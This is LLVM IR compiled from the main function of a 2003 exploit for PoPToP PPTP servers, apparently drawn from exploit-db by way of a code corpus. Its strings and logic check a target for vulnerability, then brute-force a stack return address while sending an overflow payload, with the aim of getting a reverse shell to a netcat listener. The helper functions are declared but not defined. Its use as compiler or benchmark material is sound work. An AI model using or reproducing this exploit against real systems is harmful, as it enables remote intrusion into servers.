; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22479.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22479.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.pptp_reply = type { %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32, i32 }

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"                   D  H     H                            \0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"                   D  H     H     T\0A\00", align 1
@.str.3 = private unnamed_addr constant [59 x i8] c"                   D  H  H  H     T     EE    AA   M   M \0A\00", align 1
@.str.4 = private unnamed_addr constant [59 x i8] c"               DDD D  HHHHHHH     T    E  E  A  A  MM MM \0A\00", align 1
@.str.5 = private unnamed_addr constant [59 x i8] c"              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \0A\00", align 1
@.str.6 = private unnamed_addr constant [59 x i8] c"             D     D  H     H     T    EEE   AAAA  M M M \0A\00", align 1
@.str.7 = private unnamed_addr constant [59 x i8] c"              D    D  H     H     T    E     A  A  M   M \0A\00", align 1
@.str.8 = private unnamed_addr constant [60 x i8] c"               DDDD   H     H      TTT  EEE  A  A  M   M   \00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c" ... presents ... \0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [85 x i8] c"Exploit for PoPToP PPTP server older than \0A1.1.4-b3 and 1.1.3-20030409 under Linux.\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"by .einstein., April 2003.\0A\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"usage: \0A\00", align 1
@.str.13 = private unnamed_addr constant [59 x i8] c"  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [70 x i8] c"    <pptp_server> is the ip address or hostname of the PoPToP server\0A\00", align 1
@.str.15 = private unnamed_addr constant [61 x i8] c"      you want to attack.  Port 1723 is used for connection\0A\00", align 1
@.str.16 = private unnamed_addr constant [64 x i8] c"    <your_ip> and <your_port> - specify an ip address to which\0A\00", align 1
@.str.17 = private unnamed_addr constant [65 x i8] c"      a connection is possible to port <your_port> and set up a\0A\00", align 1
@.str.18 = private unnamed_addr constant [52 x i8] c"      netcat listener. You'll get a reverse shell.\0A\00", align 1
@.str.19 = private unnamed_addr constant [76 x i8] c"    <timeout> is a delay between stack bruteforce attemts, in milliseconds\0A\00", align 1
@.str.20 = private unnamed_addr constant [64 x i8] c"   If you only pass a single parameter, the program will check\0A\00", align 1
@.str.21 = private unnamed_addr constant [66 x i8] c"   whether remote server is vulnerable or not. Otherwise it will\0A\00", align 1
@.str.22 = private unnamed_addr constant [30 x i8] c"   perform a ret bruteforce.\0A\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"usage examples:\0A\00", align 1
@.str.24 = private unnamed_addr constant [35 x i8] c"  %s 192.168.1.2 192.168.1.1 5555\0A\00", align 1
@.str.25 = private unnamed_addr constant [61 x i8] c"    attack 192.168.1.2 and get a reverse shell on port 5555\0A\00", align 1
@.str.26 = private unnamed_addr constant [35 x i8] c"  %s 127.0.0.1 127.0.0.1 6666 100\0A\00", align 1
@.str.27 = private unnamed_addr constant [61 x i8] c"    attack a locally running pptpd with a timeout of 100 ms\0A\00", align 1
@.str.28 = private unnamed_addr constant [35 x i8] c"    and get a shell on port 6666.\0A\00", align 1
@.str.29 = private unnamed_addr constant [19 x i8] c"  %s 192.168.1.56\0A\00", align 1
@.str.30 = private unnamed_addr constant [63 x i8] c"    check if the PoPToP server on 192.168.1.56 is vulnerable.\0A\00", align 1
@.str.31 = private unnamed_addr constant [41 x i8] c"\0AChecking if the server is vulnerable..\0A\00", align 1
@.str.32 = private unnamed_addr constant [42 x i8] c"(if it is you have to wait 65 seconds)..\0A\00", align 1
@st = common dso_local global i32 0, align 4
@.str.33 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.34 = private unnamed_addr constant [18 x i8] c"PoPToP server is \00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"vulnerable!\0A\00", align 1
@.str.36 = private unnamed_addr constant [16 x i8] c"not vulnerable\0A\00", align 1
@.str.37 = private unnamed_addr constant [38 x i8] c"[!] Attempting bruteforce against %s\0A\00", align 1
@.str.38 = private unnamed_addr constant [53 x i8] c"interrupt when you get a shell to %s on port %d...\0A\0A\00", align 1
@TOPOFSTACK = common dso_local global i32 0, align 4
@BOTTOMOFSTACK = common dso_local global i32 0, align 4
@.str.39 = private unnamed_addr constant [5 x i8] c"[*] \00", align 1
@.str.40 = private unnamed_addr constant [13 x i8] c"[ret=0x%x]..\00", align 1
@.str.41 = private unnamed_addr constant [18 x i8] c"sending payload..\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@STEP = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.pptp_reply, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.3, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.4, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.5, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.6, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.7, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.8, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.10, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 2
  br i1 %26, label %27, label %59

27:                                               ; preds = %2
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0))
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.13, i64 0, i64 0), i8* %31)
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.14, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.15, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.16, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.17, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.18, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.19, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.20, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.21, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.22, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i64 0, i64 0))
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.24, i64 0, i64 0), i8* %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.25, i64 0, i64 0))
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.26, i64 0, i64 0), i8* %50)
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.27, i64 0, i64 0))
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0))
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.29, i64 0, i64 0), i8* %56)
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.30, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %169

59:                                               ; preds = %2
  store i32 500, i32* %6, align 4
  %60 = load i32, i32* %4, align 4
  %61 = icmp sge i32 %60, 5
  br i1 %61, label %62, label %67

62:                                               ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 4
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65)
  store i32 %66, i32* %6, align 4
  br label %67

67:                                               ; preds = %62, %59
  %68 = load i32, i32* %4, align 4
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %70, label %115

70:                                               ; preds = %67
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @connect_server(i8* %73)
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

76:                                               ; preds = %70
  store i32 1, i32* %3, align 4
  br label %169

77:                                               ; preds = %70
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.31, i64 0, i64 0))
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.32, i64 0, i64 0))
  %80 = load i32, i32* @st, align 4
  %81 = call i32 @send_init_request(i32 %80)
  store i32 16843009, i32* %7, align 4
  %82 = load i32, i32* @st, align 4
  %83 = bitcast %struct.pptp_reply* %9 to i8*
  %84 = call i32 @recv(i32 %82, i8* %83, i32 2, i32 0)
  store i32 %84, i32* %8, align 4
  %85 = getelementptr inbounds %struct.pptp_reply, %struct.pptp_reply* %9, i32 0, i32 0
  %86 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %85, i32 0, i32 1
  %87 = load i32, i32* %86, align 4
  %88 = call i32 @ntohs(i32 %87)
  store i32 %88, i32* %8, align 4
  %89 = load i32, i32* @st, align 4
  %90 = bitcast %struct.pptp_reply* %9 to i8*
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  %92 = load i32, i32* %8, align 4
  %93 = sub nsw i32 %92, 2
  %94 = call i32 @recv(i32 %89, i8* %91, i32 %93, i32 0)
  store i32 %94, i32* %8, align 4
  %95 = getelementptr inbounds %struct.pptp_reply, %struct.pptp_reply* %9, i32 0, i32 0
  %96 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @htons(i32 %97)
  store i32 %98, i32* %10, align 4
  %99 = load i32, i32* @st, align 4
  %100 = load i32, i32* %7, align 4
  %101 = call i32 @send_ping_overflow(i32 %99, i32 %100, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0), i32 0)
  %102 = load i32, i32* @st, align 4
  %103 = bitcast %struct.pptp_reply* %9 to i8*
  %104 = call i32 @recv(i32 %102, i8* %103, i32 2, i32 0)
  store i32 %104, i32* %8, align 4
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.34, i64 0, i64 0))
  %106 = load i32, i32* %8, align 4
  %107 = icmp ne i32 %106, -1
  br i1 %107, label %108, label %110

108:                                              ; preds = %77
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0))
  br label %112

110:                                              ; preds = %77
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.36, i64 0, i64 0))
  br label %112

112:                                              ; preds = %110, %108
  %113 = load i32, i32* @st, align 4
  %114 = call i32 @close(i32 %113)
  store i32 1, i32* %3, align 4
  br label %169

115:                                              ; preds = %67
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 1
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.37, i64 0, i64 0), i8* %118)
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 2
  %122 = load i8*, i8** %121, align 8
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 3
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @atoi(i8* %125)
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.38, i64 0, i64 0), i8* %122, i32 %126)
  store i32 0, i32* %11, align 4
  %128 = load i32, i32* @TOPOFSTACK, align 4
  store i32 %128, i32* %7, align 4
  br label %129

129:                                              ; preds = %162, %115
  %130 = load i32, i32* %7, align 4
  %131 = load i32, i32* @BOTTOMOFSTACK, align 4
  %132 = icmp sge i32 %130, %131
  br i1 %132, label %133, label %168

133:                                              ; preds = %129
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0))
  %135 = load i8**, i8*** %5, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 1
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @connect_server(i8* %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %141, label %140

140:                                              ; preds = %133
  store i32 1, i32* %3, align 4
  br label %169

141:                                              ; preds = %133
  %142 = load i32, i32* %7, align 4
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.40, i64 0, i64 0), i32 %142)
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.41, i64 0, i64 0))
  %145 = load i32, i32* @st, align 4
  %146 = call i32 @send_init_request(i32 %145)
  %147 = load i32, i32* @st, align 4
  %148 = load i32, i32* %7, align 4
  %149 = load i8**, i8*** %5, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 2
  %151 = load i8*, i8** %150, align 8
  %152 = load i8**, i8*** %5, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 3
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @atoi(i8* %154)
  %156 = call i32 @send_ping_overflow(i32 %147, i32 %148, i8* %151, i32 %155)
  %157 = load i32, i32* @st, align 4
  %158 = call i32 @close(i32 %157)
  %159 = load i32, i32* %6, align 4
  %160 = call i32 @sleep(i32 %159)
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i64 0, i64 0))
  br label %162

162:                                              ; preds = %141
  %163 = load i64, i64* @STEP, align 8
  %164 = load i32, i32* %7, align 4
  %165 = sext i32 %164 to i64
  %166 = sub nsw i64 %165, %163
  %167 = trunc i64 %166 to i32
  store i32 %167, i32* %7, align 4
  br label %129

168:                                              ; preds = %129
  store i32 0, i32* %3, align 4
  br label %169

169:                                              ; preds = %168, %140, %112, %76, %27
  %170 = load i32, i32* %3, align 4
  ret i32 %170
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @connect_server(i8*) #1

declare dso_local i32 @send_init_request(i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @send_ping_overflow(i32, i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
